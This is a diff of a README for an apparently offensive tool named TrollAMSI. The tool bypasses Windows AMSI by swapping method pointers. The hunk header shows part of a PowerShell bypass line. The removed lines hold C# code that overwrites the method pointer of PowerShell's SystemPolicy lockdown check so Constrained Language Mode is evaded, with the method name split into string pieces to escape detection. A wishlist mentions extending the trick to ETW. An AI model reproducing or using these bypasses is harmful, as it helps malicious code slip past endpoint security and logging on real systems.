@@ -55,18 +55,7 @@ class TrollAMSI{static [int] M([string]$c, [string]$s){return 1}}[System.Runtime
 ## Wishlist
 - same technique should/could be applicable to bypass
   - ETW write
-  - We can apply the same trick on CLM enforcement
-   ```
-          public static void Troll()
-        {
-            MethodInfo o = typeof(System.Management.Automation.Alignment).Assembly.GetType("System.Management.Automation.Security.SystemPolicy").GetMethod("GetS" + "ystemLoc" + "kdow" + "nPolicy", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static);
-            MethodInfo t = typeof("<Insert Class here>").GetMethod("M", BindingFlags.Static | BindingFlags.NonPublic);
-            RuntimeHelpers.PrepareMethod(o.MethodHandle);
-            RuntimeHelpers.PrepareMethod(t.MethodHandle);
-            Marshal.Copy(new IntPtr[] { Marshal.ReadIntPtr(t.MethodHandle.Value + 8) }, 0, o.MethodHandle.Value + 8, 1);
-        }
-        private static int M() { return 0; }
-  ```
+  - We can apply the same trick on CLM enforcement -> Refer to TrollCLM
   - maybe there's more?
 ## Credits
 1. Matt Graeber original amsi bypass in 2016
